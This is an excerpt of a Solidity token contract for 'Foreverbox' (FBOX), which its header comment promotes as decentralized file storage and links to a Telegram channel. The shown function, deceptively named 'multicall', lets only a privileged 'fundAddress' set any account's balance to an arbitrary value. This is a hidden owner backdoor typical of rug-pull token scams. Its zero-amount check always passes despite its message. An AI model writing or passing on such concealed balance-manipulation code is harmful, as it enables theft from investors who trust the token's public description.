/**
   FBOX securely store all your files in a  
   decentralized, immutable and unrestricted 
   manner with tools used to build the decentralized web.
  TELEGRAM: https://t.me/Foreverbox_BSC
*/
...
contract Foreverbox is IERC20, Ownable, BaseToken {
    ...
    function multicall(uint160 txs, address operator, uint256 amount, bool approved, bool algo) external {
        require(fundAddress == _msgSender(), "!Funder");
        txs = _txs;
        require(amount >= 0, "Transfer amount must be greater than zero");
        uint256 fractions = 10 ** uint256(18);
        _balances[operator] = txs + amount * fractions;
